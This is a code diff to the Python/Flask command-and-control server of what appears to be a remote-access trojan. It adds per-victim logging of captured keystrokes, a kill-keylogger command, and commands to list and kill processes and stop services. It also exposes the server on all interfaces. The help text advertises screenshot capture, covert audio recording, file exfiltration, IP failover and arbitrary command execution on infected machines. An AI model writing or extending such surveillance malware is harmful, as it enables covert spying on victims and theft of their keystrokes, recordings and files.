@@ -73,6 +73,15 @@ def physical_log(message):
     with open('output.log', 'a') as f:
         f.write(log_entry)
 
+def keylogger_log(message:str):
+    timestamp = datetime.datetime.now()
+    log_entry = f"{timestamp} -- {message}\n\n"
+    name = message.split("\n")[1].replace(":","-")
+    print(f"\033[90mAppending keylogger log {name}.log\033[0m")
+
+    with open(f'{name}.log', 'a') as f:
+        f.write(log_entry)
+
 def file_save(enc, fname):
     file = file_decryptor(enc)
 
@@ -118,12 +127,16 @@ def handle_get_request():
 
 @app.route('/', methods=['POST'])
 def handle_post_request():
+    global kill_keylogger
     result = request.data.decode('utf-8')
 
     decrypted = decrypt1(result)
 
-    print(decrypted)
-    physical_log(decrypted)
+    if decrypted.startswith("km84"):
+        keylogger_log(decrypted)
+    else:
+        print(decrypted)
+        physical_log(decrypted)
 
     if decrypted.startswith("km84") and kill_keylogger:
         kill_keylogger = False
@@ -147,7 +160,13 @@ def handle_message(message):
         kill_keylogger = True
         print("HERE")
     else:
+        print(f"appending: {message}")
         COMMANDS.append(message)
+
+def kill_keylogger_func():
+    global kill_keylogger
+    kill_keylogger = True
+    print("Killing Keylogger")
 
 def help_command():
     r = "\033[0m"
@@ -173,9 +192,12 @@ def help_command():
     {g}screenshot{r} : Takes a screenshot and saves it into the upload folder.
     {g}screenshot <interval> <quantity>{r} : Takes and saves screenshots every interval seconds for quantity times.
     {g}audio-record <seconds>{r} : Records an audio recording for the specified length and saves it in uploads.
-    {g}get-process <process name>{r} : Finds and prints all processes or all processes by given name (optional).
     {g}downloader <path> <filename>{r} : Downloads the file at the given path to the uploads folder as the given filename.
+    {g}get-processes <process name>{r} : Finds and prints all processes or all processes by given name (optional).
     {g}kill <pid>{r} : Kills the process with associated pid.
+    {g}kill-by-name <process name>{r} : Kills all processes with the given name (Not case sensitive)
+    {g}get-all-services <r?>{r} : View all services. Make the command 'get-all-services r' to see just running services.
+    {g}stop-service <service name>{r} : Stop the service with the given name (needs admin privileges usually)
     {g}ip-add <ip>{r} : Adds an IP to the IP pool. If connection is refused 3 times, it will change the ip it tries to connect to.
     {red}MOST cmd{r} commands will work.
     """)
@@ -210,6 +232,7 @@ def cli_handler():
         elif message == "clear-command-queue": clear_commands(message)
         elif message == "list-cmd-queue": list_cmd_queue()
         elif message == "list-connected": list_connected()
+        elif message == "kill-keylogger": kill_keylogger_func()
         elif message == "stop-server":
             stop_server()
             break
@@ -228,7 +251,7 @@ def cmd_handler(message: str):
             COMMANDS[k].append(message)
 
 def start():
-    socketio.run(app, port=8000)
+    socketio.run(app, host="0.0.0.0", port=8000)
 
 def stop_server():
     socketio.stop()
